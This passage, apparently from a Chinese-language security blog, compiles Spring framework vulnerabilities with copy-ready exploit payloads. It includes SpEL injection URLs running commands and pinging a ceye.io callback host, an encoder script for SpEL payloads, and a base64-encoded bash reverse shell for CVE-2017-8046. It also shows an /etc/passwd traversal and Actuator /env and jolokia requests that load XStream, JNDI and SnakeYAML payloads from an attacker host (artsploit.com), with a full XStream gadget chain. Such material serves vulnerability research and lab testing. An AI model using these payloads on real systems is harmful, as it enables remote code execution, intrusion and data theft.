exploit-cve2016-2173.jar</span><br></pre></td></tr></table></figure><p>本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。</p><h2 id="0x07-CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞"><a href="#0x07-CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞" class="headerlink" title="0x07 CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞"></a>0x07 CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞</h2><p>影响版本：2.0.0-2.0.9、1.0.0-1.0.5</p><p><a href="https://www.seebug.org/vuldb/ssvid-92474" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92474</a></p><p>漏洞利用POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;2334-1&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/1.png" alt></p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://207.246.79.196:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/2.png" alt></p><p>但是此命令执行，不会在页面上显示，只会打印出运行的对象。</p><p>如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的 值时会进行一次转义，利用如下脚本加工。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">message = input(&apos;Enter message to encode:&apos;)</span><br><span class="line"></span><br><span class="line">print(&apos;Decoded string (in ASCII):\n&apos;)</span><br><span class="line">print(&apos;T(java.lang.Character).toString(%s)&apos; % ord(message[0]), end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:   </span><br><span class="line">print(&apos;.concat(T(java.lang.Character).toString(%s))&apos; % ord(ch), end=&quot;&quot;), </span><br><span class="line">print(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">print(&apos;new java.lang.String(new byte[]&#123;&apos;, end=&quot;&quot;),</span><br><span class="line">print(ord(message[0]), end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:   </span><br><span class="line">print(&apos;,%s&apos; % ord(ch), end=&quot;&quot;), </span><br><span class="line">print(&apos;)&#125;&apos;)</span><br></pre></td></tr></table></figure><p>执行输出后再添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(payload)</span><br></pre></td></tr></table></figure><h2 id="0x08-CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞"><a href="#0x08-CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞" class="headerlink" title="0x08 CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞"></a>0x08 CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞</h2><blockquote><p>影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p></blockquote><p><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html</a></p><p>下载存在漏洞的版本1.3.0：<a href="https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip</a></p><p>POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?payload=$&#123;new%20java.lang.String(new%20byte[]&#123;70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66&#125;)&#125;结果：FBB204A4061FFBD41284A84C258C1BFB返回结果是md5(wooyun)</span><br></pre></td></tr></table></figure><h2 id="0x09-CVE-2016-6652-Spring-Data-JPA-SQL盲注"><a href="#0x09-CVE-2016-6652-Spring-Data-JPA-SQL盲注" class="headerlink" title="0x09 CVE-2016-6652 Spring Data JPA SQL盲注"></a>0x09 CVE-2016-6652 Spring Data JPA SQL盲注</h2><p>影响版本：Spring Data JPA 1.10.2、1.9.4</p><p><a href="https://www.seebug.org/vuldb/ssvid-92534" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92534</a></p><h2 id="0x10-CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞"><a href="#0x10-CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞" class="headerlink" title="0x10 CVE-2017-4971 Spring WebFlow 远程代码执行漏洞"></a>0x10 CVE-2017-4971 Spring WebFlow 远程代码执行漏洞</h2><blockquote><p>影响版本：Spring Web Flow 2.4.0 to 2.4.4</p></blockquote><p>使用vulhub搭建环境后，在添加poc执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;ping&quot;,&quot;xxx.ceye.io&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/3.png" alt></p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/4.png" alt></p><p>无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/5.png" alt></p><h2 id="0x11-CVE-2017-8045-Spring-Amqp中的远程代码执行"><a href="#0x11-CVE-2017-8045-Spring-Amqp中的远程代码执行" class="headerlink" title="0x11 CVE-2017-8045 Spring Amqp中的远程代码执行"></a>0x11 CVE-2017-8045 Spring Amqp中的远程代码执行</h2><blockquote><p>影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本</p></blockquote><p><a href="https://xz.aliyun.com/t/36" target="_blank" rel="noopener">https://xz.aliyun.com/t/36</a></p><h2 id="0x12-CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码"><a href="#0x12-CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码" class="headerlink" title="0x12 CVE-2017-8046 Spring Data REST PATCH请求远程执行代码"></a>0x12 CVE-2017-8046 Spring Data REST PATCH请求远程执行代码</h2><blockquote><p>影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本</p></blockquote><p><a href="https://www.cnblogs.com/co10rway/p/9380441.html" target="_blank" rel="noopener">https://www.cnblogs.com/co10rway/p/9380441.html</a></p><p>利用POC执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&apos;ping xxx.ceye.io&apos;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure><p>反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload Workarounds</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&apos;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/6.png" alt></p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/7.png" alt></p><h2 id="0x13-CVE-2018-1258-Spring-Security未经授权的访问"><a href="#0x13-CVE-2018-1258-Spring-Security未经授权的访问" class="headerlink" title="0x13 CVE-2018-1258 Spring Security未经授权的访问"></a>0x13 CVE-2018-1258 Spring Security未经授权的访问</h2><blockquote><p>影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本）</p></blockquote><p>暂无详细信息</p><h2 id="0x14-CVE-2018-1259-具有XMLBeam的Spring-DataXXE"><a href="#0x14-CVE-2018-1259-具有XMLBeam的Spring-DataXXE" class="headerlink" title="0x14 CVE-2018-1259 具有XMLBeam的Spring DataXXE"></a>0x14 CVE-2018-1259 具有XMLBeam的Spring DataXXE</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XMLBeam 1.4.14或更早版本结合使用的Spring Data Commons</span><br><span class="line">Spring Data Commons 1.13至1.13.11（Ingalls SR11）</span><br><span class="line">Spring Data REST 2.6至2.6.11（Ingalls SR11）</span><br><span class="line">Spring Data Commons 2.0至2.0.6（Kay SR6）</span><br><span class="line">Spring Data REST 3.0至3.0.6（Kay SR6）</span><br></pre></td></tr></table></figure><p><a href="http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/</a></p><p><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">https://xz.aliyun.com/t/2341</a></p><h2 id="0x15-CVE-2018-1270-Spring-Messaging远程代码执行漏洞"><a href="#0x15-CVE-2018-1270-Spring-Messaging远程代码执行漏洞" class="headerlink" title="0x15 CVE-2018-1270 Spring Messaging远程代码执行漏洞"></a>0x15 CVE-2018-1270 Spring Messaging远程代码执行漏洞</h2><blockquote><p>影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14</p></blockquote><p>同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/8.png" alt></p><p>从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包</p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/9.png" alt></p><p>在发送任意消息，即可触发</p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/10.png" alt></p><p>或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py" target="_blank" rel="noopener">poc</a></p><h2 id="0x16-CVE-2018-1271-Spring-MVC-目录穿越漏洞"><a href="#0x16-CVE-2018-1271-Spring-MVC-目录穿越漏洞" class="headerlink" title="0x16 CVE-2018-1271 Spring MVC 目录穿越漏洞"></a>0x16 CVE-2018-1271 Spring MVC 目录穿越漏洞</h2><p>当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。</p><p>此漏洞触发条件较高：</p><ol><li>Server运行于Windows系统上</li><li>从文件系统提供的文件服务（比如使用file协议，但不是file open）</li><li>没有使用CVE-2018-1199漏洞的补丁</li><li>不使用Tomcat或者是WildFly做Server</li></ol><p>漏洞利用和复现:</p><p><a href="https://blog.knownsec.com/2018/08/spring-mvc-目录穿越漏洞cve-2018-1271分析/" target="_blank" rel="noopener">https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/</a></p><h2 id="0x17-CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞"><a href="#0x17-CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞" class="headerlink" title="0x17 CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞"></a>0x17 CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</span><br><span class="line">Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</span><br><span class="line">Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</span><br><span class="line">Spring Data REST 3.0 - 3.0.5 (Kay SR5)</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/hac425/p/9656747.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9656747.html</a></p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/11.png" alt></p><p>POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=xxxusername[T(java.lang.Runtime).getRuntime().exec(&quot;ping+xxx.ceye.io&quot;)]=test</span><br></pre></td></tr></table></figure><h2 id="0x18-CVE-2018-1260-Spring-Security-Oauth2-远程代码执行"><a href="#0x18-CVE-2018-1260-Spring-Security-Oauth2-远程代码执行" class="headerlink" title="0x18 CVE-2018-1260 Spring Security Oauth2 远程代码执行"></a>0x18 CVE-2018-1260 Spring Security Oauth2 远程代码执行</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3 to 2.3.2</span><br><span class="line">Spring Security OAuth 2.2 to 2.2.1</span><br><span class="line">Spring Security OAuth 2.1 to 2.1.1</span><br><span class="line">Spring Security OAuth 2.0 to 2.0.14</span><br></pre></td></tr></table></figure><p><a href="https://www.seebug.org/vuldb/ssvid-97287" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97287</a></p><p>此漏洞和CVE-2016-4977类似</p><p>POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.baidu.com&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D</span><br></pre></td></tr></table></figure><h2 id="0x19-CVE-2018-15758-spring-security-oauth2权限提升"><a href="#0x19-CVE-2018-15758-spring-security-oauth2权限提升" class="headerlink" title="0x19 CVE-2018-15758 spring-security-oauth2权限提升"></a>0x19 CVE-2018-15758 spring-security-oauth2权限提升</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3至2.3.3</span><br><span class="line">Spring Security OAuth 2.2至2.2.2</span><br><span class="line">Spring Security OAuth 2.1至2.1.2</span><br><span class="line">Spring Security OAuth 2.0到2.0.15</span><br></pre></td></tr></table></figure><p>使用了EnableResourceServer并且用了<code>AuthorizationRequest</code>的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。</p><p>例如劫持code，并且篡改其中的scope到all的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://127.0.0.1&amp;scope=openid</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/12.png" alt></p><p>即授权了读取权限的时候，修改为all就可以获得全部权限。</p><h2 id="0x20-CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历"><a href="#0x20-CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历" class="headerlink" title="0x20 CVE-2019-3799 Spring Cloud Config Server: 目录遍历"></a>0x20 CVE-2019-3799 Spring Cloud Config Server: 目录遍历</h2><blockquote><p>影响版本：Spring-Cloud-Config-Server &lt; 2.1.2, 2.0.4, 1.4.6</p></blockquote><p>下载受影响的版本构建：<a href="https://github.com/spring-cloud/spring-cloud-config" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd spring-cloud-config-server                                                                   ../mvnw spring-boot:run</span><br></pre></td></tr></table></figure><p>构建成功后访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd</span><br></pre></td></tr></table></figure><p>其中路径代表：<code>/{name}/{profile}/{label}/</code>，如下中所显示的json。</p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/13.png" alt></p><h2 id="0x21-CVE-2019-3778-Spring-Security-OAuth-开放重定向"><a href="#0x21-CVE-2019-3778-Spring-Security-OAuth-开放重定向" class="headerlink" title="0x21 CVE-2019-3778 Spring Security OAuth 开放重定向"></a>0x21 CVE-2019-3778 Spring Security OAuth 开放重定向</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3 to 2.3.4</span><br><span class="line">Spring Security OAuth 2.2 to 2.2.3</span><br><span class="line">Spring Security OAuth 2.1 to 2.1.3</span><br><span class="line">Spring Security OAuth 2.0 to 2.0.16</span><br></pre></td></tr></table></figure><p><a href="https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70" target="_blank" rel="noopener">https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70</a></p><p>用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。</p><p>例如原始请求如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://localhost:8086/login</span><br></pre></td></tr></table></figure><p>只需要修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://%localhost:8086/login</span><br></pre></td></tr></table></figure><p>这样就不会产生原本的认证错误，而且直接跳转到地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: http://localhost:8086/login</span><br></pre></td></tr></table></figure><h2 id="0x22-CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><a href="#0x22-CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞" class="headerlink" title="0x22 CNVD-2019-11630 Spring Boot Actuator命令执行漏洞"></a>0x22 CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</h2><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#</a></p><p>这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点</p><ul><li>Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/dump-显示线程转储（包括堆栈跟踪）</span><br><span class="line">/trace-显示最后几条HTTP消息（其中可能包含会话标识符）</span><br><span class="line">/logfile-输出日志文件的内容</span><br><span class="line">/shutdown-关闭应用程序</span><br><span class="line">/mappings-显示所有MVC控制器映射</span><br><span class="line">/env-提供对配置环境的访问</span><br><span class="line">/restart-重新启动应用程序</span><br></pre></td></tr></table></figure><ul><li>jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a href="http://127.0.0.1:8090/jolokia/list" target="_blank" rel="noopener">http://127.0.0.1:8090/jolokia/list</a></li></ul><p>Logback库提供的<strong>reloadByURL</strong>操作使我们可以从外部URL重新加载日志配置，地址如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/</span><br><span class="line"></span><br><span class="line">logback.xmllogback.xml：</span><br><span class="line">&lt;configuration&gt;  </span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;ldap://artsploit.com:1389/jndi&quot; as=&quot;appName&quot; /&gt;&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>reloadByURL功能从<a href="http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。" target="_blank" rel="noopener">http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。</a></p><ul><li>通过/env来修改配置</li></ul><p>如果Spring Cloud Libraries在类路径中，则<strong>‘/ env’</strong>端点允许您修改Spring环境属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /env HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:65</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream</span><br></pre></td></tr></table></figure><p>此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client &lt;1.8.7，则可以利用其中的<strong>XStream反序列化漏洞</strong>。</p><p>其中xstream的内容类似如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                    &lt;command&gt;</span><br><span class="line">                      &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;</span><br><span class="line">                    &lt;/command&gt;</span><br><span class="line">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                  &lt;/next&gt;</span><br><span class="line">                &lt;/iter&gt;</span><br><span class="line">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                  &lt;method&gt;</span><br><span class="line">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                    &lt;parameter-types/&gt;</span><br><span class="line">                  &lt;/method&gt;</span><br><span class="line">                  &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                &lt;/filter&gt;</span><br><span class="line">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">              &lt;/serviceIterator&gt;</span><br><span class="line">              &lt;lock/&gt;</span><br><span class="line">            &lt;/cipher&gt;</span><br><span class="line">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure><p>然后调用’/ refresh’端点。</p><ul><li>有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /env HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 59</span><br><span class="line">spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml</span><br></pre></td></tr></table></figure><p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  